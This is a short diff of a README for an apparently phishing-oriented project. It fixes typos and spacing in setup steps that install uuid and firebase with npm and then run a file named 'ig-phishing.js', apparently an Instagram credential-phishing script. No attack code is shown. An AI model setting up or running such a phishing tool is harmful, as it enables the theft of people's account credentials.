@@ -1,6 +1,6 @@
-#The react site is hosted which is not to be bothered about and the main project lies within the src folder. Kindly install uuid and firebase using the commads:
+# The react site is hosted which is not to be bothered about and the main project lies within the src folder. Kindly install uuid and firebase using the commands:
 ### `npm i -g uuid firebase`
-#after which you can run the ig-phishing.js file inside src.
+# after which you can run the ig-phishing.js file inside src.
 The rest of the project is just the source code for the hosted site.
 
 # Getting Started with Create React App
